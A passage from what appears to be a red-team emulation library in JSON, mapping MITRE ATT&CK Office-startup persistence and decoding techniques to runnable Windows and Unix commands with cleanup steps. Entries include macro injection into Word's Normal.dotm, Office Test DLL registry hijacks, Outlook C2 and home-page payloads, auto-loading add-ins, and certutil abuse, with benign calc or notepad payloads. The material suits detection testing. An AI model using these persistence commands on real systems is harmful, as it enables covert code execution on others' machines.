          "description": "Update the userprincipalname to meet your requirements",
          "check_command": "Update the input arguments so the userprincipalname value is accurate for your environment",
          "install_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""
        }
      ],
      "rx_module_id": "228c7498-be31-48e9-83b7-9cb906504ec8",
      "module_name": "Azure AD - Create a new user via Azure CLI"
    },
    {
      "index": 878,
      "technique_id": "T1137",
      "technique_name": "Office Application Startup",
      "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '1'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\" /v Level /t REG_DWORD /d 1 /f\nmkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1\necho \"RAGLOX Threat Library TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM\n",
        "elevation_required": false,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\" /v Level /f >nul 2>&1\ndel %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c",
      "module_name": "Office Application Startup - Outlook as a C2"
    },
    {
      "index": 879,
      "technique_id": "T1137.001",
      "technique_name": "Office Application Startup: Office Template Macros.",
      "description": "Injects a Macro in the Word default template \"Normal.dotm\" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData = \"1\"\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Get the value of the Key/Value pair\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\n# Logical operation to: if the value of the key/value is 1, do nothing - \n# if the value is 0, change it to 1 and create flag1 - \n# if it doesn't exist, create the value and flag2\nif ($value -eq \"1\") \n{\n  Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\n}   \n  elseif ($value -eq \"0\") \n{\n  Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag1\" > $flagPath1\n} \n  else \n{\n  Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag2\" > $flagPath2\n}\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Create copy of orginal template for restoral\nCopy-Item -Path $docPath -Destination $copyPath -Force\n# VBA code to be insterted as a Macro\n# Will create a scheduled task to open the Calculator at 8:04pm daily\n$vbaCode = @\"\n  Sub AutoExec()\n  Dim applicationPath As String\n  Dim taskName As String\n  Dim runTime As String\n  Dim schTasksCmd As String\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\n  taskName = \"OpenCalcTask\"\n  runTime = \"20:04\"\n  schTasksCmd = \"schtasks /create /tn \"\"\" & taskName & \"\"\" /tr \"\"\" & applicationPath & \"\"\" /sc daily /st \" & runTime & \" /f\"\n  Shell \"cmd.exe /c \" & schTasksCmd, vbNormalFocus\n  End Sub\n\"@\n# Create a new instance of Word.Application\n$word = New-Object -ComObject Word.Application\n# Keep the Word application hidden\n$word.Visible = $false\n# Open the document\n$document = $word.Documents.Open($docPath)\n# Access the VBA project of the document\n$vbaProject = $document.VBProject\n# Add a new module to the VBA project\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\n# Add the VBA code to the new module\n$newModule.CodeModule.AddFromString($vbaCode)\n# Run the Macro\n$word.run(\"AutoExec\")\n# Save and close the document\n$document.SaveAs($docPath)\n$document.Close()\n# Quit Word\n$word.Quit()\n# Release COM objects\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null\n",
        "elevation_required": true,
        "cleanup_command": "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData1 = \"1\"\n$registryData0 = \"0\"\n# Defines the path each flag file created depending on the original registry state\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Delete the scheduled task created by the Macro\nschtasks /Delete /TN \"OpenCalcTask\" /F | Out-Null\n#Restore the orginal template if the backup copy exists\nif (Test-Path $copyPath)\n{\n  #Delete the injected template\n  Remove-Item -Force $docPath -ErrorAction SilentlyContinue\n  # Restore the original template\n  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue\n  Write-Host \"The original template has been restored\"\n}\n  else\n{\n  Write-Host \"The original template is present\"\n}\n#Restore the original state of the registry key\nif (Test-Path $flagPath1) \n{\n  # The value was originally 0, set back to 0\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null\n  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue\n  Write-Host \"The original registry state has been restored\"\n} \n  elseif (Test-Path $flagPath2)\n{\n  #The value did not previously exist, delete the value\n  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null\n  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null\n  Write-Host \"The original registry state has been restored\"\n}\n  else \n{\n  # The value was already 1, do nothing\n  Write-Host \"The value $registryValue already existed in $registryKey.\"\n}\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Word must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "940db09e-80b6-4dd0-8d4d-7764f89b47a8",
      "module_name": "Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell"
    },
    {
      "index": 880,
      "technique_id": "T1137.002",
      "technique_name": "Office Application Startup: Office Test",
      "description": "Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office\napplication is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToRagloxModulesFolder\\T1137.002\\bin\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"PathToRagloxModulesFolder\\T1137.002\\bin\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office test\\Special\\Perf\" -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Word must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
        },
        {
          "description": "DLL files must exist on disk at specified location",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\T1137.002\\bin\\officetest_x64.dll\") -and (Test-Path \"PathToRagloxModulesFolder\\T1137.002\\bin\\officetest_x86.dll\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1137.002\\bin\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.002/bin/officetest_x64.dll\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.002\\bin\\officetest_x64.dll\"\nInvoke-Webrequest -Uri \"htps://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.002/bin/officetest_x86.dll\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.002\\bin\\officetest_x86.dll\""
        }
      ],
      "rx_module_id": "c3e35b58-fe1c-480b-b540-7600fb612563",
      "module_name": "Office Application Startup Test Persistence (HKCU)"
    },
    {
      "index": 881,
      "technique_id": "T1137.004",
      "technique_name": "Office Application Startup: Outlook Home Page",
      "description": "This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.\n\nTriggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe add HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f\n",
        "elevation_required": false,
        "cleanup_command": "reg.exe delete HKCU\\Software\\Microsoft\\Office\\#{outlook_version}\\Outlook\\WebView\\#{outlook_folder} /v URL /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "url",
          "description": "URL to Outlook Home Page containing the payload to execute (can be local file:// or remote https://)",
          "type": "string",
          "default_value": "file://PathToRagloxModulesFolder\\T1137.004\\src\\T1137.004.html"
        },
        {
          "name": "outlook_version",
          "description": "Version of Outlook that is installed",
          "type": "float",
          "default_value": 16.0
        },
        {
          "name": "outlook_folder",
          "description": "Name of the Outlook folder to modify the homepage setting for",
          "type": "string",
          "default_value": "Inbox"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7a91ad51-e6d2-4d43-9471-f26362f5738e",
      "module_name": "Install Outlook Home Page Persistence"
    },
    {
      "index": 882,
      "technique_id": "T1137.006",
      "technique_name": "Office Application Startup: Add-ins",
      "description": "Loads an XLL file using the excel add-ins library.\nThis causes excel to launch Notepad.exe as a child process. This RAGLOX module does not include persistent code execution as you would typically see when this is implemented in malware.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Excel must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
        },
        {
          "description": "XLL files must exist on disk at specified location",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\""
        }
      ],
      "rx_module_id": "441b1a0f-a771-428a-8af0-e99e4698cda3",
      "module_name": "Code Executed Via Excel Add-in File (XLL)"
    },
    {
      "index": 883,
      "technique_id": "T1137.006",
      "technique_name": "Office Application Startup: Add-ins",
      "description": "Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started\nThe sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n",
        "elevation_required": false,
        "cleanup_command": "$ver = (New-Object -COMObject \"Excel.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Excel must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
        },
        {
          "description": "XLL files must exist on disk at specified location",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\""
        }
      ],
      "rx_module_id": "9c307886-9fef-41d5-b344-073a0f5b2f5f",
      "module_name": "Persistent Code Execution Via Excel Add-in File (XLL)"
    },
    {
      "index": 884,
      "technique_id": "T1137.006",
      "technique_name": "Office Application Startup: Add-ins",
      "description": "Creates a Word Add-in file (WLL) which runs automatically when Word is started\nThe sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.\nSuccessfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Word must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
        },
        {
          "description": "WLL files must exist on disk at specified location",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\") -and (Test-Path \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.006/bin/Addins/wordwll_x64.wll\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.006/bin/Addins/wordwll_x86.wll\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\""
        }
      ],
      "rx_module_id": "95408a99-4fa7-4cd6-a7ef-cb65f86351cf",
      "module_name": "Persistent Code Execution Via Word Add-in File (WLL)"
    },
    {
      "index": 885,
      "technique_id": "T1137.006",
      "technique_name": "Office Application Startup: Add-ins",
      "description": "Creates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started\nThe sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\"\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Excel must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
        },
        {
          "description": "XLAM file must exist on disk at specified location",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.006/bin/Addins/ExcelVBAaddin.xlam\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\""
        }
      ],
      "rx_module_id": "082141ed-b048-4c86-99c7-2b8da5b5bf48",
      "module_name": "Persistent Code Execution Via Excel VBA Add-in File (XLAM)"
    },
    {
      "index": 886,
      "technique_id": "T1137.006",
      "technique_name": "Office Application Startup: Add-ins",
      "description": "Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started\nThe sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n",
        "elevation_required": false,
        "cleanup_command": "$ver = (New-Object -COMObject \"PowerPoint.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"PowerPnt\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.ppam\"  -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Excel must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"PowerPoint.Application\" | Out-Null\n  Stop-Process -Name \"PowerPnt\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft PowerPoint manually to meet this requirement\"\n"
        },
        {
          "description": "PPAM file must exist on disk at specified location",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1137.006/bin/Addins/PptVBAaddin.ppam\" -UseBasicParsing -OutFile \"PathToRagloxModulesFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\""
        }
      ],
      "rx_module_id": "f89e58f9-2b49-423b-ac95-1f3e7cfd8277",
      "module_name": "Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)"
    },
    {
      "index": 887,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "certutil -encode #{executable} %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe\n",
        "elevation_required": false,
        "cleanup_command": "del %temp%\\T1140_calc.txt >nul 2>&1\ndel %temp%\\T1140_calc_decoded.exe >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "executable",
          "description": "name of executable",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "dc6fe391-69e6-4506-bd06-ea5eeb4082f8",
      "module_name": "Deobfuscate/Decode Files Or Information"
    },
    {
      "index": 888,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -encode #{executable} %temp%\\T1140_calc2.txt\n%temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe\n",
        "elevation_required": false,
        "cleanup_command": "del %temp%\\tcm.tmp >nul 2>&1\ndel %temp%\\T1140_calc2.txt >nul 2>&1\ndel %temp%\\T1140_calc2_decoded.exe >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "executable",
          "description": "name of executable/file to decode",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "71abc534-3c05-4d0c-80f7-cbe93cb2aa94",
      "module_name": "Certutil Rename and Decode"
    },
    {
      "index": 889,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Use Python to decode a base64-encoded text string and echo it to the console\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"#{message}\".encode());print(enc.decode())')\npython3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"\necho $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"\necho $ENCODED > #{encoded_file} && python3 -c \"import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "message",
          "description": "Message to print to the screen",
          "type": "string",
          "default_value": "Hello from RAGLOX Threat Library test T1140!"
        },
        {
          "name": "encoded_file",
          "description": "File to temporarily save encoded text",
          "type": "path",
          "default_value": "/tmp/T1140.encoded"
        }
      ],
      "prerequisites": [
        {
          "description": "Python must be present\n",
          "check_command": "which python3\n",
          "install_command": "echo \"Please install Python 3\"\n"
        }
      ],
      "rx_module_id": "356dc0e8-684f-4428-bb94-9313998ad608",
      "module_name": "Base64 decoding with Python"
    },
    {
      "index": 890,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Use Perl to decode a base64-encoded text string and echo it to the console    \n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('#{message}'));\")\nperl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"\necho $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'\necho $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,\"<\",\"#{encoded_file}\");print(decode_base64(<$f>));'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "message",
          "description": "Message to print to the screen",
          "type": "string",
          "default_value": "Hello from RAGLOX Threat Library test T1140!"
        },
        {
          "name": "encoded_file",
          "description": "File to temporarily save encoded text",
          "type": "path",
          "default_value": "/tmp/T1140.encoded"
        }
      ],
      "prerequisites": [
        {
          "description": "Perl must be present\n",
          "check_command": "which perl\n",
          "install_command": "echo \"Please install Perl\"\n"
        }
      ],
      "rx_module_id": "6604d964-b9f6-4d4b-8ce8-499829a14d0a",
      "module_name": "Base64 decoding with Perl"
    },
    {
      "index": 891,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
